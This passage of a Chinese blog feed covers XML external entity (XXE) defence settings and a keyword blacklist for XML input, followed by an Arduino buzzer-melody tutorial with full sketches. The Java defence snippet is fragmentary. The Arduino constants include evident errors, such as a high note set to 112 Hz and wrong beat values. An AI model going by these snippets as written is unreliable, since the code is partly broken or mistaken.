title="XXE防御"></a>XXE防御</h1><ol><li><p>禁用外部实体应用 </p><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></li><li><p>黑名单过滤</p></li></ol><p>建立黑名单，如&lt;、DOCTYPE、ENTITY、SYSTEM、PUBLIC等字符，过滤掉用户输入的敏感词。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://xz.aliyun.com/t/3357#toc-11">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p>[2] <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#xxe%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">XXE漏洞学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduino致听体验</title>
      <link href="posts/64177.html"/>
      <url>posts/64177.html</url>
      
        <content type="html"><![CDATA[<div class="note red icon simple"><i class="note-icon fas fa-bullhorn"></i><p>上次Arduino小车无果而终之后，决定整点好玩的。没错，它来了，它来了，蜂鸣器带着它<del>好听</del>的音乐走来了。</p></div><h1 id="所用材料"><a href="#所用材料" class="headerlink" title="所用材料"></a>所用材料</h1><ol><li>Adruino uno一块</li><li>面包板一个</li><li>无源蜂鸣器一个</li><li>杜邦线若干</li></ol><h1 id="硬件接线"><a href="#硬件接线" class="headerlink" title="硬件接线"></a>硬件接线</h1><table><thead><tr><th align="center">arduino</th><th align="center">蜂鸣器</th></tr></thead><tbody><tr><td align="center">5V</td><td align="center">VCC</td></tr><tr><td align="center">GND</td><td align="center">GND</td></tr><tr><td align="center">8</td><td align="center">I/O</td></tr></tbody></table><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210403160903354.png" alt="image-20210403160903354"></p><h1 id="发出声音"><a href="#发出声音" class="headerlink" title="发出声音"></a>发出声音</h1><p>前面我们已经把数字IO连接到了蜂鸣器的正极，让蜂鸣器响起来只需要在数字IO上放入方波即可。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">HIGH</span>); <span class="comment">//高电平</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">LOW</span>);  <span class="comment">//低电平</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>其中的100指的是发声后延时100ms</p><h1 id="唱出旋律"><a href="#唱出旋律" class="headerlink" title="唱出旋律"></a>唱出旋律</h1><p>如果只是发出响声的话，那也太鸡肋了吧？如果要发出精确的不同频率的乐音怎么办？难道还要算？（下面是一张乐音频率图）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMTA3MjE1ODQ2NzU5" alt="音符表"></p><p>算是不可能啦，这里直接把大佬们“翻译”好的代码搬了过来，感谢分享！下面三首“歌曲”可以试着听一下~</p><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">葫芦娃</button></li><li class="tab"><button type="button" data-href="#-2">千本樱</button></li><li class="tab"><button type="button" data-href="#-3">爱拼才会赢</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E8%91%AB%E8%8A%A6%E5%A8%83.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D1 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D2 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D3 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D4 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D5 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D6 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D7 556</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL1 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL2 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL3 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL4 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL5 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL6 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL7 278</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH1 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH2 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH3 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH4 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH5 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH6 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH7 112</span></span><br><span class="line"><span class="comment">//以上部分是定义是把每个音符和频率值对应起来，其实不用打这么多，但是都打上了，后面可以随意编写D调的各种歌，我这里用NOTE_D+数字表示音符，NOTE_DH+数字表示上面有点的那种音符，NOTE_DL+数字表示下面有点的那种音符。这样后面写起来比较好识别。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">//这部分是用英文对应了拍子，这样后面也比较好看</span></span><br><span class="line"><span class="keyword">int</span> tune[] =</span><br><span class="line">&#123;</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,</span><br><span class="line">  </span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,</span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D7,NOTE_D7,NOTE_D5,NOTE_D3,</span><br><span class="line">  NOTE_D5,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D3,NOTE_D3,NOTE_D1,NOTE_DL6,</span><br><span class="line">  NOTE_D1,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D7,NOTE_D5,</span><br><span class="line">  NOTE_D6,</span><br><span class="line">&#125;;<span class="comment">//这部分就是整首曲子的音符部分，用了一个序列定义为tune，整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> duration[]=</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  </span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">&#125;;<span class="comment">//这部分是整首曲子的接拍部分，也定义个序列duration，浮点（数组的个数和前面音符的个数是一样的，一一对应么）</span></span><br><span class="line"><span class="keyword">int</span> length;<span class="comment">//这里定义一个变量，后面用来表示共有多少个音符</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>;<span class="comment">//蜂鸣器的pin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);<span class="comment">//设置蜂鸣器的pin为输出模式</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);<span class="comment">//这里用了一个sizeof函数，可以查出tone序列里有多少个音符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)<span class="comment">//循环音符的次数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);<span class="comment">//此函数依次播放tune序列里的数组，即每个音符</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">400</span>*duration[x]);<span class="comment">//每个音符持续的时间，即节拍duration，400是调整时间的越大，曲子速度越慢，越小曲子速度越快，自己掌握吧</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);<span class="comment">//停止当前音符，进入下一音符</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//等待5秒后，循环重新开始</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E5%8D%83%E6%9C%AC%E6%A8%B1.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A1 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A2 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3 556</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A4 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A5 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A6 742</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL1 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL2 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL3 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL4 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL5 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL6 371</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL7 416</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH1 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH2 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH3 1112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH4 1178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH5 1322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH6 1484</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH7 1665</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 这部分是用英文对应了拍子 **********/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这部分就是整首曲子的音符部分,用了一个序列定义为tune，整数 */</span></span><br><span class="line"><span class="keyword">int</span> tune[] = &#123;</span><br><span class="line">  A0,A0,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH3,AH1,AH2,A6,A0,A3,A5,</span><br><span class="line">  A6,A0,A0,A5,A6,A0,A0,A5,</span><br><span class="line">  A6,AH1,A5,A6,A3,A5,A1,A2,</span><br><span class="line">  A3,AH1,A6,AH3,</span><br><span class="line">  AH2,AH3,AH2,AH1,AH2,A6,A0,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,AH4,AH4,AH3,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  A6,A6,A6,A5,A5,A6,</span><br><span class="line">  A6,A6,A6,A6,AH1,AH2,AH3,</span><br><span class="line">  AH6,A5,A5,A6,A6</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这部分是整首曲子的接拍部分，也定义个序列duration，浮点（数组的个数和前面音符的个数是一样的） */</span></span><br><span class="line"><span class="keyword">float</span> duration[]= &#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**********************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;     <span class="comment">/* 这里定义一个变量，后面用来表示共有多少个音符 */</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>; <span class="comment">/* 蜂鸣器的pin */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* 设置蜂鸣器的pin为输出模式 */</span></span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);</span><br><span class="line">  <span class="comment">/* 这里用了一个sizeof函数，可以查出tone序列里有多少个音符 */</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* 循环音符的次数 */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)&#123;</span><br><span class="line">    <span class="comment">/* 此函数依次播放tune序列里的数组，即每个音符 */</span></span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);</span><br><span class="line">    <span class="comment">/* 每个音符持续的时间，即节拍duration，450是调整时间的越大，曲子速度越慢 */</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">450</span>*duration[x]);</span><br><span class="line">    <span class="comment">/* 停止当前音符，进入下一音符 